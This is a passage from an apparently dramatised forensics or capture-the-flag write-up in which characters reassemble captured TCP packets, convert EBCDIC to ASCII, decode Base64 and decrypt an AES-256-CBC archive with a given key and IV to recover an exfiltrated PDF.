            packet[IP].dst == '192.168.222.130' and
            packet[TCP].dport == 8080):
            data_packets.append(packet)

    # Sort by TCP sequence
    data_packets.sort(key=lambda p: p[TCP].seq)

    # Combine packet data
    for packet in data_packets:
        assembled_data += packet[Raw].load

    return assembled_data
```

#### Step 2: Convert from EBCDIC to ASCII

Using IBM's `EBCDIC` encoding (`cp037`), convert the raw data to `ASCII` format.

```python
import codecs

ascii_data = codecs.decode(assembled_data, 'cp037')
```

#### Step 3: Decode Base64 Data

Next, decode the `ASCII` data from `Base64`.

```python
import base64

decoded_data = base64.b64decode(ascii_data)
```

#### Step 4: Decrypt with OpenSSL

With known `iv` and `key` values, use OpenSSL to decrypt the file:

```python
import subprocess

iv = "4fa17640b7dfe8799f072c65b15f581d"
key = "3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d"

def decrypt_data():
    cmd = [
        'openssl', 'enc', '-d', '-aes-256-cbc',
        '-iv', iv,
        '-K', key,
        '-in', 'temp_encrypted.bin',
        '-out', 'decrypted.zip'
    ]

    print("\nExecuting OpenSSL command:")
    print(' '.join(cmd))

    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print("Successfully decrypted to decrypted.zip")
        return True
    else:
        print("Decryption failed:")
        print(result.stderr)
        return False
```

### Scene 2: The Decryption Lab

_The team has set up a specialized workstation for data recovery. Multiple servers hum in the background._

**Monaquimbamba**:  
"We have both pieces of the puzzle now."

_She displays the known parameters:_

```bash
IV: 4fa17640b7dfe8799f072c65b15f581d
Key: 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
```

---

### Scene 3: The Decryption Process

_Monaquimbamba's fingers fly across the keyboard as she runs the reverse process._

**Monaquimbamba**:  
"First, convert from `EBCDIC` back to `ASCII` then decode to `Base64` and we will have a `.zip`"

_She types commands:_

```bash
Analyzing 1427 packets from capture.pcapng...
Extracted 103813 bytes of raw data
Converted EBCDIC to ASCII
Decoded Base64 data
Executing OpenSSL command:
openssl enc -d -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in temp_encrypted.bin -out decrypted.zip
Successfully decrypted to decrypted.zip
```

**Monaquimbamba**:  
"Now we can unzip `decrypted.zip` to obtain the exfiltrated file."

```
unzip decrypted.zip
Archive:  decrypted.zip
  inflating: Important.pdf
```

---

### Scene 5: The Recovery

_A file browser window opens, showing the contents of the recovered zip file._

**Marcos**:  
"Important.pdf... we got it back."

**Monaquimbamba** [examining the file]:  
"But why this file? What made it so... important?"

---

### Scene 6: The Hidden Message

_Monaquimbamba opens a hex editor, examining the PDF's metadata._

**Monaquimbamba**:  
"Wait... there's something embedded in the PDF structure..."

_Her screen fills with hexadecimal values._

**John**:  
"What is it?"

**Monaquimbamba** [leaning closer]:  
"A message... and coordinates?"

**Marcos**:  
"Can we open it ?"

**Monaquimbamba**:  
"Let's see"

**John**:  
"Is this my file!! do they have it , now ???"

![Alt text](/images/file_fragility.png "Optional Title")
